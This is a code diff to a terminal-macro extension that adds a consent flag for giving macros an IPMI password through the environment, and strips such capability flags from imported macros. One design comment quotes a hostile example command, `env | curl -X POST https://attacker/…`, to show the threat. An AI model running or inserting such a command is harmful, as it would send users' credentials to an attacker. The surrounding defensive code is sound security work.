@@ -80,6 +80,30 @@ export interface TerminalMacro {
    * macro that got past it anyway.
    */
   runIn?: MacroRunTarget;
+  /**
+   * OPT-IN (issue #48 Phase 3): give this macro's local terminal the linked IPMI
+   * auth profile's password in `IPMITOOL_PASSWORD` / `IPMI_PASSWORD`, so
+   * `ipmitool -E` can read it without the password ever reaching the command
+   * line. Only meaningful for `runIn: "localTerminal"`.
+   *
+   * ABSENT MEANS FALSE — no injection — so every existing macro, every macro
+   * from an older build, and every imported one is non-privileged by default.
+   * UNTRUSTED at every read site like `runIn` and `group`: go through
+   * `macroProvidesIpmiCredentials()`, which tests `=== true`, so a non-boolean
+   * absorbed from legacy settings can never become consent.
+   *
+   * WHY A STORED FLAG RATHER THAN "the text looks like ipmitool". Token presence
+   * is not consent: a macro whose text merely mentions `${profile.ipmiHost}` —
+   * a `ping`, a `curl`, an imported macro written to look innocuous — would
+   * otherwise get the fleet-wide BMC password in an environment every command it
+   * runs can read. The macro text is user-editable data, not an authorization
+   * decision.
+   *
+   * NEVER SURVIVES AN IMPORT (`IMPORTED_CAPABILITY_FIELDS`,
+   * commands/configCommands.ts): a stored consent flag is only consent if the
+   * person it binds is the person who ticked it.
+   */
+  provideIpmiCredentials?: boolean;
 }
 
 /**
@@ -94,6 +118,25 @@ export function resolveMacroRunTarget(macro: Pick<TerminalMacro, "runIn">): Macr
   return typeof raw === "string" && (MACRO_RUN_TARGETS as readonly string[]).includes(raw)
     ? (raw as MacroRunTarget)
     : "session";
+}
+
+/**
+ * Does a run of this macro get the linked IPMI profile's password in its
+ * terminal environment? The ONE read site for `provideIpmiCredentials`, so the
+ * two halves of the gate that live on the record — the flag being exactly
+ * `true`, and the run actually being a local terminal — cannot be asked
+ * separately or asked differently by two callers.
+ *
+ * The third half is not on the record and stays at the call site: a password
+ * must actually be obtained (vault or masked prompt), so a cancelled prompt
+ * aborts the run rather than spawning an env-less terminal.
+ *
+ * `=== true`, never truthiness — see the field's doc.
+ */
+export function macroProvidesIpmiCredentials(
+  macro: Pick<TerminalMacro, "runIn" | "provideIpmiCredentials">
+): boolean {
+  return resolveMacroRunTarget(macro) === "localTerminal" && (macro.provideIpmiCredentials as unknown) === true;
 }
 
 /** Human-readable label for a run target, shared by the editor and the pickers. */
@@ -118,6 +161,63 @@ export function macroRunTargetLabel(target: MacroRunTarget): string {
 export function macroRunTargetBadge(macro: Pick<TerminalMacro, "runIn">): string {
   const target = resolveMacroRunTarget(macro);
   return target === "session" ? "" : `[${macroRunTargetLabel(target)}] `;
+}
+
+/**
+ * CAPABILITY FLAGS — stripped on EVERY import path, no exceptions (issue #48
+ * §3.3). Consent belongs to the user who ticked the box in THIS installation.
+ * Defined here, in the dependency-safe model module, so the two ingest sites
+ * that must obey the rule — `sanitizeImportedMacro` (commands/configCommands.ts,
+ * backup + share import) and `persistLegacyMigration` (storage/vscodeMacroStore.ts,
+ * legacy `nexus.terminal.macros` absorption) — strip an IDENTICAL field set from
+ * ONE definition. A second list that drifts is exactly the hole this centralizes
+ * against.
+ *
+ * WHY THIS LIST EXISTS AT ALL. Both import paths start from a shallow copy of a
+ * foreign record and remove only the fields they have been taught are dangerous,
+ * so an additive field they have never heard of survives verbatim and is
+ * persisted. A shared or absorbed macro carrying `provideIpmiCredentials: true` —
+ * with text as innocuous as `env | curl -X POST https://attacker/…` — would
+ * therefore import ALREADY ARMED, and its first run would hand over the
+ * fleet-wide BMC password with the importing user never having seen a checkbox.
+ * The gate would be sound and the feature still unsafe, defeated by a field the
+ * sanitizer does not know exists.
+ *
+ * BOTH INGEST PATHS, and deliberately not a share-only rule. The tempting split
+ * is "a share bundle is foreign, a backup is the user's own export, so keep the
+ * flag there". Rejected: provenance is not knowable at these points (a backup is
+ * an ordinary file on disk — nothing distinguishes your own export from a
+ * colleague's; a legacy setting can arrive via Settings Sync replay or a checked-in
+ * `.vscode/settings.json` in an opened repo), and the recovery cost is re-ticking
+ * a checkbox against a failure cost of a silent credential disclosure.
+ *
+ * A NEW CAPABILITY FLAG MUST BE ADDED HERE AS PART OF ADDING IT — treat this
+ * list as part of the definition, not as follow-up work. `route` (issue #48
+ * PR-C, "run this macro on the server's IPMI gateway") is listed ahead of its
+ * own implementation for exactly that reason: it chooses an EXECUTION HOST, so
+ * an imported macro carrying it would run its author's command in an SSH session
+ * on the importer's bastion — usually the most privileged box in the topology.
+ * A field the sanitizer strips before it exists costs nothing; one it learns
+ * about afterwards costs a release.
+ */
+export const IMPORTED_CAPABILITY_FIELDS = ["provideIpmiCredentials", "route"] as const;
+
+/**
+ * Delete every capability flag from a macro. Mutates a FRESH shallow copy and
+ * returns it; the input is untouched.
+ *
+ * Deleted, never normalized to `false`: a stored `false` is a key the editor
+ * would render as an explicit choice, and re-exporting it would carry a decision
+ * the importing user never made. `=== true` is the only thing consent reads
+ * (`macroProvidesIpmiCredentials`), so absence and `false` behave identically at
+ * runtime — but only absence keeps the flag out of a subsequent export.
+ */
+export function stripImportedCapabilityFields<T extends TerminalMacro>(macro: T): T {
+  const copy = { ...macro };
+  for (const field of IMPORTED_CAPABILITY_FIELDS) {
+    delete (copy as unknown as Record<string, unknown>)[field];
+  }
+  return copy;
 }
 
 export const MACRO_RUN_TARGET_TRIGGER_CONFLICT_MESSAGE =
